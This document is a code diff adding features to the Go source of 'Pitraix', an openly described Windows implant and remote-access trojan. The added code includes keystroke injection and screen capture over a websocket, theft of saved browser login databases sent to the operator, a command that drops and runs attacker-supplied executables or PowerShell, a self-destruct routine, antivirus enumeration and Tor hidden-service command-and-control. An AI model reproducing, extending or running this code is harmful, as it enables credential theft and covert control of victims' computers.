@@ -11,6 +11,12 @@
 	Then HST would only use that AES key for communcations
 
 	- If things could be random, even pesudorandom, lyst would do so. This rule applies to ports, locations, names, length of names of all files Pitraix will drop. To reduce detection rate
+
+	- Pitraix then modifies it's hardcoded agent address with it's own address and persists.
+
+
+	I know this file could be split into a billion file, but for now this works perfect.
+
 */
 
 package main
@@ -45,13 +51,20 @@ import (
 	"archive/zip"
 	"path/filepath"
 	"syscall"
+	"image"
+	"image/jpeg"
+	"reflect"
 	"errors"
 
 	"unsafe"
 	"gopkg.in/toast.v1"
+
+	// "github.com/go-vgo/robotgo"
+	"github.com/micmonay/keybd_event"
 	"golang.org/x/net/proxy"
 	"github.com/atotto/clipboard"
 	"github.com/TheTitanrain/w32"
+	"github.com/gorilla/websocket"
 )
 
 const (
@@ -64,11 +77,10 @@ const (
 	bitcoinSegwitAddr = "OPTIONAL"
 	bitcoinLegacyAddr = "OPTIONAL"
 	ethereumAddr	  = "OPTIONAL"
-	
-	
-	antiVM_Enabled = false // turn this back to true if you don't want VMS to run pitraix
 
 	
+
+	antiVM_Enabled = false // make it true if you don't want pitraix to run in virtual machines
 
 	// DO NOT CHANGE THIS MANUALLY, RUN OPER
 	raw_OPEncryptionKeyPEM = `RXLCJAFYNIYZRZMWTZNMIYVSKFUAYJFSZUDIKNRNPMHOTDVSCRGLYTATTRGKGHPWDUMGEUHTTMEBAJRNEOYRDDUDMNWGBWEOASVYVGZZCRXIRUZIFBPAVMZZEWATVSYQNYDJLZPSMYGTOPUSPBRASSWWFOQGWZLRCWQMVKCXTUFGSIVPDKCLLWDIFAWWCVXBXUKOKALCPQKBWGRFTFGZQGZUOAHOZYSSWOBCZKEBLWFBJBQZTXCGZOJIDCYHGWSJGCNAVXAIZUDPPUIIFWYZKYASBNWDVIHCOSYNSTWENAJJSUPXAUSVSXYTVDNYGMVTHAQAURQVKTWYOBOSLFKYWOSPZJTRKQLLOPJTGNOXGGHCTNATRCBGVAIMFWSSTRJSJACBJFQRUJRGESXYSSIUIYWFEDZHSPEEIHSRCFAOCWRRQJMDOOFZOLNPXWDUWXATEBIDKFMZBMSNMPMCYNJNGQGARSVPAWWFDVTGNEXVIRZVXJNXIIWEZKSGPERFKUXTFDHMRSBXUVDQJSUCLMIHYFVRIZRJKSLBEWKDVYFXMDMELBTLCGORDJFJPWNDEXVNXVVXYTAAMYKWYSHZDNVAZYTCBYOLBIJAWBGKVTHWVOEEULFWXEZQNSCWVRMUGIBYUHUIKEVMPDAOMSKXAXZSEHCYIMIIAFLFBBFMTZMOIAHKPUVXNKIUGWETMFSPEEXKOGPCQRLKSGMLZTAWKFDMCQLGPZFDDOHHKPIBOJCKDIGAKWYADJQTOFHWPXKBGYELBQELQULTTIQNJFCBHJAUYCEUOIZAFOVEKDQAKLW`
@@ -80,52 +92,145 @@ const (
 
 
 
-	osName = 1 // Do not change this unless you know what you are doing
-	ddosCounter = 30 // Do not change this unless you know what you are doing
-
+	osName = 1 		 // Do not change this unless you know what you are doing
+	ddosCounter = 25 // Do not change this unless you know what you are doing
 
 )
 
-var (
+var (	
+	
+	// if this is enabled (recommended), TOR will use snowfalek, the obfs4Bridges list be ignored and obfs4 be disabled
+	useSnowflake = false 
+
+	// This is a list of obfs4proxy bridges, I recommend going to `bridges.torproject.org` and replacing them for best stealth. Remember to put the bridges in same format as these default ones	
+	obfs4Bridges = []string{ 
+		"46.8.43.62:2056 E262FA34E312499C2E5C4739B9E8A0FD89E53C72 cert=EzlP6NEGZVaFAsY2O0tUIWv50tiMI6XJd7tJN1EGldRZlXeOoM/i3Aiy98Ey+07aslOOKg",
+		"92.222.170.125:52234 CCD3DB930A2E621485C341B2013901A33A7FDA7F cert=aZXyZcI9kyh+G/jN8qU/6PeIz7K2/MmDLLw2WjmgrueRSw3iOeS/BjLie+HBsC9Twi3bPw",
+		"80.209.236.17:443 7F9BADD4362BE90A9154D6039049277152847085 cert=xSNIifvA2figjMYM+nX2dmHQvahNtUP5jffLdjFZtWS4q8ZTBEyXHqZF+I2SpAlS5EUWDg",
+		"128.42.61.7:9002 534CCC502EE7304A6E82D12EC9B8A0D58E7FF5C1 cert=YsXM8UjMuVsQBvUASZfSXslBQxFSo+r8T54scsfeChGV2ZOHpz96Hl5s5ETC7DtxjK9iUw",
+		"31.13.195.26:46788 FE9ACB2511D606BAE9BFCF01C5A0FE27257BB4EA cert=OSdYQ1ZkzVbTW1nf7FeI/HWl6zN1WoNLz0BkWMmgeAuqvGQdzzAi1eBxUfi0olKLv7jyAA",
+		"5.161.61.213:443 04A8B84D840E96BF27CCC8575E9701410D68640C cert=SUbYQu1b+BMQpy+pR4BySzXAa/ogsDXDTH2Q0QvS9CK1rG4HfOeJmfd4Z1tW0OnSczqqEQ",
+		"83.136.108.200:9602 228A7773AD3F6B59F2B636DAA37A03E7AD81DE3B cert=fX279ASnIeHSze0yq4pNOIfq0hELNPBc9iAFsuKK+0dYwh4bZOYdV3Dius2Gwp5UVo1lIg",
+		"165.227.140.183:80 DE7FBB7E5A52399070FAC190ABF2B440F232D512 cert=zXzlmJh59YlRJ610/IhSKKtxPxS0N1K1NSEYkmf4PPXKsiPHLMAPW51uyjDz6WxvDO6cYw",
+		"84.22.109.77:8088 CEF423251E83353BD875CB5327B458F4C8751170 cert=HMCEwtFxM3OK68PTtZ0NXeYlabBRrRGF1IddIEfXk0J7Dmuq7Y2zgohCwjluwFE0AuH8Zg",
+	}
+
+	wvkl = map[int]int{
+		65: keybd_event.VK_A,
+		66: keybd_event.VK_B,
+		67: keybd_event.VK_C,
+		68: keybd_event.VK_D,
+		69: keybd_event.VK_E,
+		70: keybd_event.VK_F,
+		71: keybd_event.VK_G,
+		72: keybd_event.VK_H,
+		73: keybd_event.VK_I,
+		74: keybd_event.VK_J,
+		75: keybd_event.VK_K,
+		76: keybd_event.VK_L,
+		77: keybd_event.VK_M,
+		78: keybd_event.VK_N,
+		79: keybd_event.VK_O,
+		80: keybd_event.VK_P,
+		81: keybd_event.VK_Q,
+		82: keybd_event.VK_R,
+		83: keybd_event.VK_S,
+		84: keybd_event.VK_T,
+		85: keybd_event.VK_U,
+		86: keybd_event.VK_V,
+		87: keybd_event.VK_W,
+		88: keybd_event.VK_X,
+		89: keybd_event.VK_Y,
+		90: keybd_event.VK_Z,
+		91: keybd_event.VK_ESC,
+
+		48: keybd_event.VK_0,
+		49: keybd_event.VK_1,
+		50: keybd_event.VK_2,
+		51: keybd_event.VK_3,
+		52: keybd_event.VK_4,
+		53: keybd_event.VK_5,
+		54: keybd_event.VK_6,
+		55: keybd_event.VK_7,
+		56: keybd_event.VK_8,
+		57: keybd_event.VK_9,
+
+		96: keybd_event.VK_KP0,
+		97: keybd_event.VK_KP1,
+		98: keybd_event.VK_KP2,
+		99: keybd_event.VK_KP3,
+		100: keybd_event.VK_KP4,
+		101: keybd_event.VK_KP5,
+		102: keybd_event.VK_KP6,
+		103: keybd_event.VK_KP7,
+		104: keybd_event.VK_KP8,
+		105: keybd_event.VK_KP9,
+
+	}
+	
 	alphaletters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
 
-	user32                  = syscall.NewLazyDLL("user32.dll")
-	systemParametersInfo = user32.NewProc("SystemParametersInfoW")
-	procGetAsyncKeyState    = user32.NewProc("GetAsyncKeyState")
+	user32                 = syscall.NewLazyDLL("user32.dll")
+	systemParametersInfo   = user32.NewProc("SystemParametersInfoW")
+	procGetAsyncKeyState   = user32.NewProc("GetAsyncKeyState")
+	// procKeyBd 			   = user32.NewProc("keybd_event")
 
-	config_FilePath = "Pitraix"
+	modgdi32               = syscall.NewLazyDLL("gdi32.dll")
+	modkernel32            = syscall.NewLazyDLL("kernel32.dll")
+	procGetDC              = user32.NewProc("GetDC")
+	procReleaseDC          = user32.NewProc("ReleaseDC")
+	procDeleteDC           = modgdi32.NewProc("DeleteDC")
+	procBitBlt             = modgdi32.NewProc("BitBlt")
+	procDeleteObject       = modgdi32.NewProc("DeleteObject")
+	procSelectObject       = modgdi32.NewProc("SelectObject")
+	procCreateDIBSection   = modgdi32.NewProc("CreateDIBSection")
+	procCreateCompatibleDC = modgdi32.NewProc("CreateCompatibleDC")
+	procGetDeviceCaps      = modgdi32.NewProc("GetDeviceCaps")
+	procGetLastError       = modkernel32.NewProc("GetLastError")
+
+	config_FilePath  = "Pitraix"
 	pitraix_FilePath = "Pitraix"
-	tor_FolderPath = "Pitraix"
+	tor_FolderPath   = "Pitraix"
 
-	tmpFold 	 = os.Getenv("tmp")
+	shell = filepath.Join(mainDrive, "Windows", "System32", "cmd.exe")
 
-	username 	 = os.Getenv("username") // strings.TrimSpace(doInstru("shell", "echo %username%"))
-	osArch 		 = os.Getenv("PROCESSOR_ARCHITECTURE") // strings.Split(strings.TrimSpace(doInstru("shell", "wmic os get osarchitecture")), "\n")[1]
-	userHomeDIR  = os.Getenv("USERPROFILE")
-	mainDrive    = os.Getenv("HOMEDRIVE")
-	shell		 = mainDrive + "\\Windows\\System32\\cmd.exe"
+	username 	   = os.Getenv("USERNAME")
+	osArch 		   = os.Getenv("PROCESSOR_ARCHITECTURE")
+	userHomeDIR    = os.Getenv("USERPROFILE")
+	appDataLocal   = os.Getenv("LOCALAPPDATA")
+	appDataRoaming = os.Getenv("APPDATA")
+	tmpFold 	   = os.Getenv("TMP")
+	mainDrive      = os.Getenv("HOMEDRIVE") + "\\"
+	
 
-	PrivPaths = []string{
-		mainDrive + "\\Windows",
-		mainDrive + "\\Windows\\Logs",
-		mainDrive + "\\Windows\\security",
-		mainDrive + "\\Windows\\System32",
-		mainDrive + "Program Files (x86)\\Common Files",
-		mainDrive + "Program Files (x86)\\WindowsPowerShell",
-		mainDrive + "Program Files (x86)",
+	privPaths = []string{
+		filepath.Join(mainDrive, "Windows"),
+		filepath.Join(mainDrive, "Windows", "Logs"),
+		filepath.Join(mainDrive, "Windows", "security"),
+		filepath.Join(mainDrive, "Windows", "System32"),
+		filepath.Join(mainDrive, "Windows", "Help"),
+		filepath.Join(mainDrive, "Windows", "PrintDialog"),
+		filepath.Join(mainDrive, "Windows", "Media"),
+		filepath.Join(mainDrive, "Windows", "assembly"),
+		filepath.Join(mainDrive, "Program Files (x86)"),
+		filepath.Join(mainDrive, "Program Files (x86)", "Common Files"),
+		filepath.Join(mainDrive, "Program Files (x86)", "WindowsPowerShell"),
+		filepath.Join(mainDrive, "Program Files", "Internet Explorer"),
+
 	}
 
 	nonPrivPaths = []string{
-		mainDrive + "\\Users\\" + username + "\\AppData\\Local\\Programs",
-		mainDrive + "\\Users\\" + username + "\\AppData\\Local",
-		mainDrive + "\\Users\\" + username + "\\AppData\\Roaming",
-		mainDrive + "\\Users\\" + username + "\\AppData\\Roaming\\Microsoft",
-		mainDrive + "\\Users\\" + username + "\\AppData\\LocalLow",
+		filepath.Join(appDataLocal),
+		filepath.Join(appDataLocal, "Programs"),
+		filepath.Join(appDataLocal, "Microsoft"),
+		filepath.Join(appDataRoaming),
+		filepath.Join(appDataRoaming, "Microsoft"),
+		filepath.Join(mainDrive, "Users", username, "AppData", "LocalLow"),
+
 	}
 
 	torProxyUrl, _ = url.Parse("SOCKS5H://127.0.0.1:9050")
-
-	tbDialer, _ = proxy.FromURL(torProxyUrl, proxy.Direct)
+	tbDialer   , _ = proxy.FromURL(torProxyUrl, proxy.Direct)
 
 	contactDate string
 	firstTime bool
@@ -138,6 +243,20 @@ var (
 
 	certError_Count int
 	currentPath, _ = os.Executable()
+	macAddr	   , _ = getMacAddr()
+	antiVirus	   = strings.Split(strings.TrimSpace(doInstru("shell", "wmic /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List", true)), "=")[1]
+	mtimep int 	   = 3
+
+
+
+
+	upgrader = websocket.Upgrader{} // Websocket support
+	kb, _ = keybd_event.NewKeyBonding()
+
+	isadmin_const = isadmin()
+	
+	rdp_onetimeKey 	    string
+	browserS_onetimeKey string 
 )
 
 type config_File_Type struct {
@@ -161,6 +280,136 @@ type ipInfo struct {
 	Timezone string
 }
 
+
+func rdp(writer http.ResponseWriter, req *http.Request) {
+	c, err := upgrader.Upgrade(writer, req, nil)
+	if err != nil {
+		fmt.Println("upgrade:", err)
+		return
+	}
+	defer c.Close()
+	for {
+		mt, msg, err := c.ReadMessage()
+		if err != nil {
+			fmt.Println("read:", err)
+			break
+		}
+
+		if strings.HasPrefix(string(msg), "move") {
+			spl := strings.Split(string(msg), " ")
+			
+			x, _ := strconv.Atoi(spl[1])
+			y, _ := strconv.Atoi(spl[2])
+
+			fmt.Println("move", x, y)
+			// robotgo.Move(x, y)
+		
+			// Select keys to be pressed
+			
+		} else if strings.HasPrefix(string(msg), "key") {
+			spl := strings.Split(string(msg), " ")
+			kc, err := strconv.Atoi(spl[1])
+			fmt.Println("key", kc, err, wvkl[kc])
+
+			kb.SetKeys(wvkl[kc])
+
+			kb.Press()
+			time.Sleep(10 * time.Millisecond)
+			kb.Release()
+			
+		} else if strings.HasPrefix(string(msg), "img") {
+			err = c.WriteMessage(mt, screenshotBytes())// []byte(""))
+		
+			if err != nil {
+				fmt.Println("write:", err)
+				return
+			}
+		
+		}
+
+		// }
+
+	}
+	
+}
+
+
+func snatchBrowsersData(writer http.ResponseWriter, req *http.Request) {
+	c, err := upgrader.Upgrade(writer, req, nil)
+	if err != nil {
+		fmt.Println("upgrade:", err)
+		return
+	}
+	defer c.Close()
+	mt, msg, err := c.ReadMessage()
+	if err != nil {
+		fmt.Println("read:", err)
+		return
+	}
+
+
+	var browsersPaths = []string{
+		filepath.Join(appDataLocal, "Microsoft", "Edge"),
+		filepath.Join(appDataLocal, "Google", "Chrome"),
+		filepath.Join(appDataLocal, "BraveSoftware", "Brave-Browser"),
+		filepath.Join(appDataLocal, "Yandex", "YandexBrowser"),
+		filepath.Join(appDataRoaming, "Opera Software", "Opera Stable"),
+	}
+
+	var browserFiles = []string{
+		filepath.Join("User Data", "Default", "Login Data"),
+	}
+
+	// fmt.Println(mt, string(msg), err)
+	
+	var bigdick string
+
+	if string(msg) == "baddie" {
+		for index, browser := range browsersPaths {
+			if file_Exists(browser) {
+				fmt.Println("Yes", index, browser)
+	
+				for _, browserF := range browserFiles {
+					data, err := readFile(filepath.Join(browser, browserF))
+					fmt.Println(filepath.Join(browser, browserF), browser, browserF, len(data), err)
+					if err != nil {
+						fmt.Println(data)
+						bigdick += " " + base64.StdEncoding.EncodeToString(data)
+
+					} else {
+						fmt.Println("err", err)
+					}
+					// sendata <- data
+				}
+	
+			} else {
+				fmt.Println("No", index, browser)
+				
+			}
+	
+		}
+
+
+		err = c.WriteMessage(mt, []byte(bigdick))
+
+		if err != nil {
+			fmt.Println("write:", err)
+			return
+		}
+		
+		err = c.WriteMessage(mt, []byte("hadie"))
+
+		if err != nil {
+			fmt.Println("write:", err)
+			return
+		}
+
+	}
+
+	
+}
+
+
 func setwallpaperFile(filename string) error {
 	filenameUTF16, err := syscall.UTF16PtrFromString(filename)
 	if err != nil {
@@ -171,10 +420,230 @@ func setwallpaperFile(filename string) error {
 	return nil
 }
 
-func pemDec(key string) *pem.Block {
-	temp_pem_decode, _ := pem.Decode([]byte(key))
-	return temp_pem_decode
+// func pemDec(key string) *pem.Block {
+// 	temp_pem_decode, _ := pem.Decode([]byte(key))
+// 	return temp_pem_decode
+// }
+
+
+func screenRect() (image.Rectangle, error) {
+	hDC := getDC(0)
+	if hDC == 0 {
+		return image.Rectangle{}, fmt.Errorf("Could not Get primary display err:%d\n", getLastError())
+	}
+	defer releaseDC(0, hDC)
+	x := getDeviceCaps(hDC, DESKTOPHORZRES)
+	y := getDeviceCaps(hDC, DESKTOPVERTRES)
+	return image.Rect(0, 0, x, y), nil
 }
+
+func captureScreen() (*image.RGBA, error) {
+	r, e := screenRect()
+	if e != nil {
+		return nil, e
+	}
+	return captureRect(r)
+}
+
+func captureRect(rect image.Rectangle) (*image.RGBA, error) {
+	hDC := getDC(0)
+	if hDC == 0 {
+		return nil, fmt.Errorf("Could not Get primary display err:%d.\n", getLastError())
+	}
+	defer releaseDC(0, hDC)
+
+	m_hDC := CreateCompatibleDC(hDC)
+	if m_hDC == 0 {
+		return nil, fmt.Errorf("Could not Create Compatible DC err:%d.\n", getLastError())
+	}
+	defer deleteDC(m_hDC)
+
+	x, y := rect.Dx(), rect.Dy()
+
+	bt := BITMAPINFO{}
+	bt.BmiHeader.BiSize = uint32(reflect.TypeOf(bt.BmiHeader).Size())
+	bt.BmiHeader.BiWidth = int32(x)
+	bt.BmiHeader.BiHeight = int32(-y)
+	bt.BmiHeader.BiPlanes = 1
+	bt.BmiHeader.BiBitCount = 32
+	bt.BmiHeader.BiCompression = BI_RGB
+
+	ptr := unsafe.Pointer(uintptr(0))
+
+	m_hBmp := createDIBSection(m_hDC, &bt, DIB_RGB_COLORS, &ptr, 0, 0)
+	if m_hBmp == 0 {
+		return nil, fmt.Errorf("Could not Create DIB Section err:%d.\n", getLastError())
+	}
+	if m_hBmp == InvalidParameter {
+		return nil, fmt.Errorf("One or more of the input parameters is invalid while calling CreateDIBSection.\n")
+	}
+	defer deleteObject(HGDIOBJ(m_hBmp))
+
+	obj := selectObject(m_hDC, HGDIOBJ(m_hBmp))
+	if obj == 0 {
+		return nil, fmt.Errorf("error occurred and the selected object is not a region err:%d.\n", getLastError())
+	}
+	if obj == 0xffffffff { //GDI_ERROR
+		return nil, fmt.Errorf("GDI_ERROR while calling SelectObject err:%d.\n", getLastError())
+	}
+	defer deleteObject(obj)
+
+	if !bitBlt(m_hDC, 0, 0, x, y, hDC, rect.Min.X, rect.Min.Y, SRCCOPY) {
+		return nil, fmt.Errorf("BitBlt failed err:%d.\n", getLastError())
+	}
+
+	var slice []byte
+	hdrp := (*reflect.SliceHeader)(unsafe.Pointer(&slice))
+	hdrp.Data = uintptr(ptr)
+	hdrp.Len = x * y * 4
+	hdrp.Cap = x * y * 4
+
+	imageBytes := make([]byte, len(slice))
+
+	for i := 0; i < len(imageBytes); i += 4 {
+		imageBytes[i], imageBytes[i+2], imageBytes[i+1], imageBytes[i+3] = slice[i+2], slice[i], slice[i+1], slice[i+3]
+	}
+
+	img := &image.RGBA{imageBytes, 4 * x, image.Rect(0, 0, x, y)}
+	return img, nil
+}
+
+func getDeviceCaps(hdc HDC, index int) int {
+	ret, _, _ := procGetDeviceCaps.Call(
+		uintptr(hdc),
+		uintptr(index))
+
+	return int(ret)
+}
+
+func getDC(hwnd HWND) HDC {
+	ret, _, _ := procGetDC.Call(
+		uintptr(hwnd))
+
+	return HDC(ret)
+}
+
+func releaseDC(hwnd HWND, hDC HDC) bool {
+	ret, _, _ := procReleaseDC.Call(
+		uintptr(hwnd),
+		uintptr(hDC))
+
+	return ret != 0
+}
+
+func deleteDC(hdc HDC) bool {
+	ret, _, _ := procDeleteDC.Call(
+		uintptr(hdc))
+
+	return ret != 0
+}
+
+func getLastError() uint32 {
+	ret, _, _ := procGetLastError.Call()
+	return uint32(ret)
+}
+
+func bitBlt(hdcDest HDC, nXDest, nYDest, nWidth, nHeight int, hdcSrc HDC, nXSrc, nYSrc int, dwRop uint) bool {
+	ret, _, _ := procBitBlt.Call(
+		uintptr(hdcDest),
+		uintptr(nXDest),
+		uintptr(nYDest),
+		uintptr(nWidth),
+		uintptr(nHeight),
+		uintptr(hdcSrc),
+		uintptr(nXSrc),
+		uintptr(nYSrc),
+		uintptr(dwRop))
+
+	return ret != 0
+}
+
+func selectObject(hdc HDC, hgdiobj HGDIOBJ) HGDIOBJ {
+	ret, _, _ := procSelectObject.Call(
+		uintptr(hdc),
+		uintptr(hgdiobj))
+
+	if ret == 0 {
+		panic("SelectObject failed")
+	}
+
+	return HGDIOBJ(ret)
+}
+
+func deleteObject(hObject HGDIOBJ) bool {
+	ret, _, _ := procDeleteObject.Call(
+		uintptr(hObject))
+
+	return ret != 0
+}
+
+func createDIBSection(hdc HDC, pbmi *BITMAPINFO, iUsage uint, ppvBits *unsafe.Pointer, hSection HANDLE, dwOffset uint) HBITMAP {
+	ret, _, _ := procCreateDIBSection.Call(
+		uintptr(hdc),
+		uintptr(unsafe.Pointer(pbmi)),
+		uintptr(iUsage),
+		uintptr(unsafe.Pointer(ppvBits)),
+		uintptr(hSection),
+		uintptr(dwOffset))
+
+	return HBITMAP(ret)
+}
+
+func CreateCompatibleDC(hdc HDC) HDC {
+	ret, _, _ := procCreateCompatibleDC.Call(
+		uintptr(hdc))
+
+	if ret == 0 {
+		panic("Create compatible DC failed")
+	}
+
+	return HDC(ret)
+}
+
+type (
+	HANDLE  uintptr
+	HWND    HANDLE
+	HGDIOBJ HANDLE
+	HDC     HANDLE
+	HBITMAP HANDLE
+)
+
+type BITMAPINFO struct {
+	BmiHeader BITMAPINFOHEADER
+	BmiColors *RGBQUAD
+}
+
+type BITMAPINFOHEADER struct {
+	BiSize          uint32
+	BiWidth         int32
+	BiHeight        int32
+	BiPlanes        uint16
+	BiBitCount      uint16
+	BiCompression   uint32
+	BiSizeImage     uint32
+	BiXPelsPerMeter int32
+	BiYPelsPerMeter int32
+	BiClrUsed       uint32
+	BiClrImportant  uint32
+}
+
+type RGBQUAD struct {
+	RgbBlue     byte
+	RgbGreen    byte
+	RgbRed      byte
+	RgbReserved byte
+}
+
+const (
+	HORZRES          = 8
+	VERTRES          = 10
+	DESKTOPHORZRES   = 118
+	DESKTOPVERTRES   = 117
+	BI_RGB           = 0
+	InvalidParameter = 2
+	DIB_RGB_COLORS   = 0
+	SRCCOPY          = 0x00CC0020
+)
 
 func readFile(filePath string) ([]byte, error){
 	file, err := os.Open(filePath)
@@ -223,7 +692,7 @@ func createConfFile(problem string) {
 	cft.ContactD = contactDate
 	cft.Logs = map[string][]string{"1": {"firstTime", "There was error with config file and had to fix: " + problem, contactDate}}
 	cft.Events = map[string][]string{"1": {"firstTime", "Opened implant", contactDate}}
-	cft.Modules = map[string][]string{"0": {}}
+	cft.Modules = map[string][]string{"IGNORED": {}}
 	cft.RegTmp  = []string{}
 	cft.RoutesH = []string{}
 	cft.Register = false
@@ -335,7 +804,8 @@ func (cft *config_File_Type) updateConf(ind string, val []string) {
 									// fmt.Println(cft.Events)
 
 								} else if ind == "modules" {
-									cft.Modules[strconv.Itoa(len(cft.Modules) + 1)] = []string{val[0], val[1], val[2]}
+									fmt.Println(ind, len(val), val)
+									cft.Modules[val[0]] = []string{val[1], val[2], val[3]}
 									
 								} else if ind == "regtmp" {
 									cft.RegTmp = append(cft.RegTmp, val[0])
@@ -373,13 +843,21 @@ func (cft *config_File_Type) updateConf(ind string, val []string) {
 								} else {
 									fmt.Println("updated cft but not conf file")
 								}
+
 							}
+
 						}
+
 					}
+
 				}
+
 			}
+
 		}
+
 	}
+
 }
 
 func isadmin() bool {
@@ -456,7 +934,7 @@ func setupTor(path, port, name string, ipinfo_struct *ipInfo, forceSetup bool) s
 				continue
 			}
 			if len(tor) < 300 {
-				fmt.Println("Not found", v1m, v2m, v3m)
+				// fmt.Println("Not found", v1m, v2m, v3m)
 				if v3m == 20 {
 					v3m = 0
 					v2m += 1
@@ -476,10 +954,16 @@ func setupTor(path, port, name string, ipinfo_struct *ipInfo, forceSetup bool) s
 					continue
 				}
 			}
+
 			if found == false {
-				fmt.Println("Found, doing found check..")
+				fmt.Println("Tor version found. Downloading..")
+				
+				// fmt.Println("Found, doing found check..")
+
 				found = true
+
 			} else {
+
 				var downloadType string
 				if osArch == "AMD64" || osArch == "64-bit" {
 					downloadType = "64"
@@ -499,47 +983,97 @@ func setupTor(path, port, name string, ipinfo_struct *ipInfo, forceSetup bool) s
 				tor, _ = getRequest(fmt.Sprintf("https://dist.torproject.org/torbrowser/%d.%d.%d/%s", v1m, v2m, v3m, fnl), false, -1)
 				// fmt.Println(tor, err)
 
-				f, _ := os.Create(filepath.Join(path, name + ".zip")) // path + "\\" + name + ".zip")
+				f, _ := os.Create(filepath.Join(path, name + ".zip"))
 				f.Write(tor)
 				f.Close()
 				unzip(filepath.Join(path, name + ".zip"), filepath.Join(path, name))
 				os.Remove(filepath.Join(path, name + ".zip"))
-				torrcf, _ := os.Create(filepath.Join(path, name, name + "torrc")) // os.Create(path + "\\" + name + "\\" + name + "torc")
+
+				torrcf, _ := os.Create(filepath.Join(path, name, name + "torrc"))
 						defer torrcf.Close()
 						torrcf.Write([]byte(fmt.Sprintf(`HiddenServiceDir %s
-				HiddenServicePort 80 127.0.0.1:%s`, filepath.Join(path, name, name + "hid"), port))) // path + "\\" + name + "\\" + name + "hid", port)))
+				HiddenServicePort 80 127.0.0.1:%s`, filepath.Join(path, name, name + "hid"), port)))
 
 				break
 			}
 
 		}
+
 	}
 
 	if ft == true && running_check("9050") {
-		doInstru("shell", "taskkill /f /im tor")
+		doInstru("shell", "taskkill /f /im tor", true)
 	}
 
-	doInstru("shellnoop", filepath.Join(path, name, "Tor", "tor.exe") + " -f " + filepath.Join(path, name, name + "torrc")) // path + "\\" + name + "\\Tor\\tor.exe -f " + path + "\\" + name + "\\" + name + "torc")
+	doInstru("shellnoop", filepath.Join(path, name, "Tor", "tor.exe") + " -f " + filepath.Join(path, name, name + "torrc"), true)
 	
 	if ft == true {
 		time.Sleep(time.Second * 5) // ensures we have enough time to connect and generate hostname on toaster
 	}
 
-	hostnamef, err := readFile(filepath.Join(path, name, name + "hid", "hostname")) // path + "\\" + name + "\\" + name + "hid\\hostname")
+	hostnamef, err := readFile(filepath.Join(path, name, name + "hid", "hostname"))
 	rhostname := strings.Split(string(hostnamef), ".")[0]
+
 	if err != nil {
 		fmt.Println("hostname read error:", err)
 		os.Remove(filepath.Join(path, name))
 		rhostname = setupTor(path, port, name, ipinfo_struct, true)
+
 	}
 
 	return rhostname
 }
 
-func doInstru(ic, iv string) string {
+
+func runModules(t string) {
+	for id, data := range cft.Modules {
+		if id == "IGNORED" {
+			continue
+		}
+
+		fmt.Println(t, "Modules called!!", id, data)
+		
+		if data[1] != t {
+			fmt.Println("ignoring cuz", t, data[1])
+			continue
+		}
+		
+		if data[0] == "powershell" {
+			doInstru("shellnoop", "powershell " + data[2], true)
+			// fmt.Println("done", out)
+			
+		} else {
+			doInstru("shellnoop", data[2], true)
+			
+		}
+
+	}
+	
+}
+
+func doInstru(ic, iv string, bypitraix bool) string {
 	// fmt.Println("doInstru", ic, iv)
+	
+	if bypitraix == false {
+		go runModules("oninstruction")
+	}
+
 	var out string 
+
 	switch (ic) {
+
+	case "selfdestruct":
+		doInstru("shell", "taskkill /f /im tor.exe", true)
+		os.Remove(config_FilePath)
+		os.RemoveAll(tor_FolderPath)
+		os.Remove(pitraix_FilePath)
+		os.Remove(currentPath)
+		os.RemoveAll(mainDrive + "\\Users\\" + username + "\\AppData\\Roaming\\tor")
+		fmt.Println("goodbye")
+		// 
+		doInstru("shell", "taskkill /f /im lyst_windows.exe", true)
+		doInstru("shell", "taskkill /f /im " + filepath.Base(pitraix_FilePath), true)
+
 	case "shell": // shell instruction with output (locking)
 		cmd := exec.Command(shell, "/c", iv)
 		var outbuffer bytes.Buffer
@@ -549,11 +1083,26 @@ func doInstru(ic, iv string) string {
 		cmd.Run()
 		
 		out = outbuffer.String()
+		// fmt.Println("shell:", shell, "ic:", ic, "iv:", iv, "out:", out)
 
 	case "shellnoop": // shell instruction without output (non locking)
 		cmd := exec.Command(shell, "/c", iv)
 		cmd.Start()
+
+
+	case "isadmin":
+		out = "No."
+
+		if isadmin_const == true {
+			out = "yes"
+		}
 	
+	case "getwsrdpkey":
+		out = rdp_onetimeKey
+
+	case "getwsbrowserkey":
+		out = browserS_onetimeKey
+		
 	case "cuexe":
 		out = currentPath
 
@@ -561,14 +1110,65 @@ func doInstru(ic, iv string) string {
 		fmt.Println(currentPath, filepath.Dir(currentPath))
 		out = filepath.Dir(currentPath)
 
+	case "push": // pushes modules
+		ivspl := strings.Split(iv, " ")
+		if len(ivspl) != 4 {
+			out = "Error: length not 4"
+		} else {
+
+			if ivspl[2] != "powershell" && ivspl[2] != "exe" {
+				out = "Error: invalid type " + ivspl[2] 
+
+			} else {
+				if ivspl[1] != "onboot" && ivspl[1] != "oninstruction" {
+					out = "Error: invalid execution " + ivspl[1] 
+				
+				} else {
+					content, err := base64.StdEncoding.DecodeString(ivspl[3])
+					if err != nil {
+						out = "Error: " + err.Error()
+					
+					} else {
+						_, err := hex.DecodeString(ivspl[0])
+						if err != nil {
+							out = "Error: " + err.Error()
+						
+						} else {
+
+							if ivspl[2] == "powershell" {
+								confAsyncChn <- []string{"modules", ivspl[0], "powershell", ivspl[1], string(content)}
+
+							} else {
+								f, _ := os.Create(filepath.Join(tmpFold,  ivspl[0] + ".exe"))
+								f.Write(content)
+								f.Close()
+
+								confAsyncChn <- []string{"modules", ivspl[0], "exe", ivspl[1], tmpFold + "\\" + ivspl[0] + ".exe"}
+
+							}
+
+							out = "Done"
+							
+						}
+
+					}
+
+				}
+
+			}
+
+		}
+
 	case "snatchregs": // snatches registered hosts from agent
 		if len(cft.RegTmp) > 0 {
 			outb, _ := json.Marshal(cft.RegTmp)
 			confAsyncChn <- []string{"clearregtmp", "1"} // SAFE clears hosts to save space
 			// cft.RegTmp = []string{} // UNSAFE clears hosts to save space
 			out = string(outb)
+
 		} else {
 			out = "No registers to snatch"
+
 		}
 
 	case "snatchlogs": // snatches logs from host
@@ -585,8 +1185,10 @@ func doInstru(ic, iv string) string {
 			outb, _ := json.Marshal(cft.Events)
 			// confAsyncChn <- []string{"clearlogs", "1"} // SAFE clears hosts to save space
 			out = string(outb)
+
 		} else {
 			out = "No events to snatch"
+
 		}
 
 	case "assign": // assigns a host to this host and turn this host into an agent
@@ -602,24 +1204,30 @@ func doInstru(ic, iv string) string {
